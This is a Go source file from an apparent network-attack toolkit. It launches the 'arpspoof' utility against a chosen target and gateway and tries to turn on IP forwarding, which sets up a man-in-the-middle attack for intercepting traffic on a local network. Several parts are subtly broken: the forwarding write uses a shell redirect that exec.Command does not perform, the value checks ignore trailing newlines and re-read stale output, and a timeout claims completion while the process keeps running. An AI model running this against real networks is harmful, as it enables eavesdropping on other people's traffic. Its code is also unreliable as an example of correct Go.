package tools

import (
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"rockitforme/banner"
	"sync"
	"syscall"
	"time"
)

func ArpSpoof(target string, gateway string, stopChan <-chan struct{}) {
	fmt.Print("\033[H\033[2J") // Clear the console
	banner.PrintBanner()

	fmt.Printf("\nARP Spoofing in progress for Target: %s, Gateway: %s\n", target, gateway)
	fmt.Print("\nPress Ctrl+C to stop and return to the main menu.\n\n")

	// Channel to receive Ctrl+C signal
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Channel to notify the ARP spoofing goroutine to stop
	internalStopChan := make(chan struct{})

	// Wait group for synchronization
	var wg sync.WaitGroup

	// Start ARP spoofing command in the background
	wg.Add(1)
	go func() {
		defer wg.Done()
		cmd := exec.Command("arpspoof", target, "-t", gateway)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Start()
		<-internalStopChan // Wait for internal stop signal
		cmd.Process.Kill() // Terminate the ARP spoofing command
	}()

	// Wait for Ctrl+C signal or ARP spoofing completion
	select {
	case <-sigChan:
		// If Ctrl+C is pressed, interrupt ARP spoofing
		fmt.Println("\nARP Spoofing interrupted. Returning to the main menu.")
		internalStopChan <- struct{}{} // Notify the internal stop channel
	case <-stopChan:
		// If stop signal received, stop ARP spoofing
		fmt.Println("\nStop signal received. Returning to the main menu.")
		internalStopChan <- struct{}{} // Notify the internal stop channel
	case <-time.After(5 * time.Second): // Adjust the duration based on your needs
		// After a certain duration, assume the ARP spoofing command has completed
		fmt.Println("\nARP Spoofing completed (for demonstration purposes).")
	}

	// Wait for the ARP spoofing goroutine to finish
	wg.Wait()
}

func CheckIPForward(setIP string) {

	if setIP == "Y" || setIP == "y" {

		cat := exec.Command("cat", "/proc/sys/net/ipv4/ip_forward")

		cat_out, catErr := cat.Output()

		if catErr != nil {
			// If there was any error, print it here
			fmt.Println("\n\nCould not run command:", catErr)
			fmt.Print("\nMust be run as root.\n\n")
			return
		}

		result_cat := string(cat_out)

		if result_cat == "0" {

			fmt.Print("\nSetting IP FORWARD to 1")
			time.Sleep(2 * time.Second)

			set := exec.Command("echo", "1", ">", "/proc/sys/net/ipv4/ip_forward")

			set.Output()

			result_cat1 := string(cat_out)

			if result_cat1 == "1" {

				fmt.Print("\nIP FORWARD 1 SUCCESSFULLY SET!")
				time.Sleep(2 * time.Second)

			}

		} else if result_cat == "1" {

			fmt.Print("\nIP FORWARD ALREADY SET TO 1.")
			time.Sleep(2 * time.Second)
			return
		}

	} else if setIP == "N" || setIP == "n" {

		return
	}

}
